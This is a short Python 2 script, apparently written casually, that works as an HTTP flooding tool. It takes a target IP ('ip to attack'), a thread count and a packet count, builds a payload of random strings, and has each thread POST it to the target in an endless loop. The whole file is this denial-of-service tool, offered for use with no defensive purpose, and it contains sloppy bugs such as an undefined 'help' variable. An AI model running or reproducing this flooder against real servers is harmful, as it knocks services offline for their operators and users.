#Couldn't sleep and got bored so yeah I wrote this.
import sys, getopt, threading, requests, random, string


def main(argv):
    help_message = "main.py -i <ip to attack> -t <threads> -n <number of packets per worker>"
    threads = 1
    num = 200000
    try:
        opts, args = getopt.getopt(argv,"h:i:t:n:",["ip=", "threads=", "num="])
    except getopt.GetoptError:
        print help
        sys.exit(2)
    for opt, arg in opts:
        if opt == '-h':
            print help_message
            sys.exit()
        elif opt in ("-i", "--ip"):
            target = arg
        elif opt in ("-t", "--threads"):
            threads = int(arg)
        elif opt in ("-n", "--num"):
            num = int(arg)

    threadList = []
    for i in range(threads):
        t = threading.Thread(target=make_header, args=(i, target, num,))
        threadList.append(t)
        t.start()
	
	
def make_header(offset, target, num):
    count = 200
    N = 16
    url = 'http://' + target
          
    payload = "{"
	
    r = requests.get(url)

    payload = "{"
    for x in range(0, count):
        globals()['block%s' % x] = (''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(N)))

    for x in range(0, count - 1):  
        payload += globals()['block%s' % x] + ":" + globals()['block%s' % (x + 1)] + ", "

    payload = payload[:-2]
    payload += "}"
    
    r = requests.get(url)

    # POST with form-encoded data
    while (1 == 1):
        for i in range(0, num):
            r = requests.post(url, data=payload)

    return

	
if __name__ == "__main__":
    main(sys.argv[1:])
